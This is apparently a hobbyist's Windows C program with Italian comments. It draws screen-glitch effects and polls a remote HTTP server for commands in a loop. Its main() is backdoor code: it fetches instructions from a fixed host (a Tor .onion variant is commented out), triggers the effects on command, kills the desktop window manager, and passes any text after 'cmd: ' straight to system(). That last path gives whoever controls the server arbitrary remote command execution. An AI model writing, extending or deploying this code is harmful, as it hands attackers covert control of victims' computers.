#include <windows.h>
#include <math.h>
#include <string.h>
#include <stdio.h>

/*
BitBlt usage:
BitBlt(hdcDest, TakeX, TakeY, TakeW, TakeH, hdcSrc, XSrc, YSrc, MODE)

Modes:
SRCCOPY - Copy
NOTSRCCOPY - Color invert
SRCINVERT - PXColor = PXColorDest + PXColoreSRC
BLACKNESS - black block
WHITENESS - white block
*/


//globalz
int w; // width
int h; // heigh

void heightglitch_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    int x = 0;

    x = rand() % w; // random lungo w
    BitBlt(hdc, x, 1, 10, h, hdc, x, 0, NOTSRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(100);
}

void widthglitch_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    int x = 0;

    x = rand() % 2; // random lungo h
    BitBlt(hdc, 10, x, w, h, hdc, 0, x, NOTSRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(100);
}

void tunnel_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);

    int newW = w - (1 * w / 100);
    int newH = h - (1 * h / 100);

    // trova il centro
    int x = (w - newW) / 2;
    int y = (h - newH) / 2;

    StretchBlt(hdc, x, y, newW, newH, hdc, 0, 0, w, h, SRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(100);
}

void circleshake_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    static float angle = 0.1f;

    int dx = (int)(sin(angle) * 100);
    int dy = (int)(cos(angle) * 100);

    BitBlt(hdc, dx, dy, w, h, hdc, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hdc);

    angle = angle + 0.1f;
}

void ltunnel_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    
    int newW = w - (10 * w / 100);
    int newH = h - (10 * h / 100);

    // centro
    int x = (w - newW) / 2;
    int y = (h - newH) / 2;

    StretchBlt(hdc, x, y, newW, newH, hdc, 0, 0, w, h, SRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(100);
}

void squarefx_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    
    //variabili statiche bcz con il while(1) esterno non verranno inizializzate in loop
    //non settare x e y a 0, altrimenti non va (idk why)
    static int x = 3;
    static int y = 3;

    //px space x&y
    static int vx = 21;
    static int vy = 21;

    HBRUSH white = CreateSolidBrush(RGB(255, 255, 255)); // crea pennello brushed bianco
    SelectObject(hdc, white); // usa sopra l'hdc, con il bianco

    Rectangle(hdc, x, y, x + 100, y + 100); // top, left, bottom, right

    //collisione destra/sinistra
    if (x + 100 >= w || x <= 0) {
        vx = -vx;
    }

    //collione alto/basso
    if (y + 100 >= h || y <= 0) {
        vy = -vy;
    }

    //movimento
    x = x + vx;
    y = y + vy;

    // quelle di sopra sono condizioni, non muovono un cazzo, grazie alla parte finale qualcosa si muove,

    //avoid mem leaks
    DeleteObject(white);
    ReleaseDC(NULL, hdc);
}

// ho capito che hdc significa HandleDeviceContext, tradotto: accesso grafico allo schermo
// Invece GetDC(NULL) si piglia tutto schermo. Forse già lo sapevi
// DC = DeviceContext
void bmp_on_screen() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL); // piglia il dc dello schermo
    HDC memdc = CreateCompatibleDC(hdc); // crea un DC compatibile in ram

    //karika il bmp (assicurati che sia real bmp. Esporta da paint per sicurezza)
    HBITMAP bmp = (HBITMAP)LoadImageA(NULL, "img1.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);

    // usa bitmap nel memdc
    SelectObject(memdc, bmp);

    BitBlt(hdc, 100, 100, 256, 256, memdc, 0, 0, SRCCOPY);

    //togli merda (aka burn garbage; aka free mem; akak liberation; aka: restituisci risorsa grafica. MUà! )
    DeleteObject(bmp);
    DeleteDC(memdc);
    ReleaseDC(NULL, hdc);
}

void startfx() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    //yeahhh starta a bestia!
    heightglitch_run();
    widthglitch_run();
    tunnel_run();
    circleshake_run();
    ltunnel_run();
    squarefx_run();
}

int main() {
    while(1) {
        printf("Clean\n");
        char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
        //FILE *pointertotextstream = popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r"); // apre curl in modalita' sola lettura. 
        FILE *pointertotextstream = popen("curl -s http://192.168.1.6:80/rce", "r"); // apre curl in modalita' sola lettura. FILE *pointer apre uno stream su popen, quindi prende l'output

        if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
        
        if (fgets(reqtextbuffer, sizeof(reqtextbuffer), pointertotextstream) == NULL) { // meaning: fgets(buffer, size, stream), mette l'out di curl dentro il buffer
            pclose(pointertotextstream);
            printf("Sleeping for 20secz\n");
            Sleep(20000);
            continue; //quitta da questo if (quindi se continua ad essere NULL riparte e ritorna qui)
        } 

        pclose(pointertotextstream); // chiude il processo creato da popen (curl) (NEVER FORGET! Altrimenti fai un mem leak più grande di casa mia e più pesante del mio subwoofer con hp e sounbar integrata)
        printf("reqtextbuffer[]: %s\n", reqtextbuffer);

        /* 
        CODENAMES:
        AllFx - 1
        HeighGlitch - 2
        WidthGlitch - 3
        TunnelRun - 4
        CircleShake - 5
        LongTunnel(morePX) - 6
        BouncySquare - 7

        Misc:
        "cmd: " - Exec a command
        */

        if (strstr(reqtextbuffer, "1")) {
            int i;
            for(i=0;i<100;i++) {
                startfx();
            }
        }

        else if (strstr(reqtextbuffer, "2")) {
            int i;
            for(i=0;i<100;i++) {
                heightglitch_run();
            }
            
        }

        else if (strstr(reqtextbuffer, "3")) {
            int i;
            for(i=0;i<100;i++) {
                widthglitch_run();
            }
        }

        else if (strstr(reqtextbuffer, "4")) {
            int i;
            for(i=0;i<100;i++) {
                tunnel_run();
            }
        }

        else if (strstr(reqtextbuffer, "5")) {
            int i;
            for (i=0;i<100;i++) {
                circleshake_run();
            }
        }

        else if (strstr(reqtextbuffer, "6")) {
            int i;
            for (i=0;i<100;i++) {
                ltunnel_run();
            }
        }

        else if (strstr(reqtextbuffer, "7")) {
            int i;
            for (i=0;i<100;i++) {
                squarefx_run();
            }
        }

        else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
            char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
            command[strcspn(command, "\r\n")] = '\0'; // toglie eventuali \r\n alla fine, per avoidare esecuzione errata a causa di byte sporchi (apici per char = 1 byte, virgolette per array di char)
            system(command); // esegui (RCE-Style)
            printf("Command Executed\n");
            printf("Sleeping for 20 secs\n");
            Sleep(20000);
        }
        else if (strstr(reqtextbuffer, "CleanDWM")) {
            system("TASKKILL /F /IM dwm.exe"); // killa dwm (previsto: riavvio automatico di DWM)
            system("start dwm.exe"); // avvio di dwm (nel caso windows non lo riavvi automaticamente)
        }
        else if (strstr(reqtextbuffer, "BMPFx1")) {
            bmp_on_screen();
        }
        else {Sleep(20000);}
    }
    return 0;
}


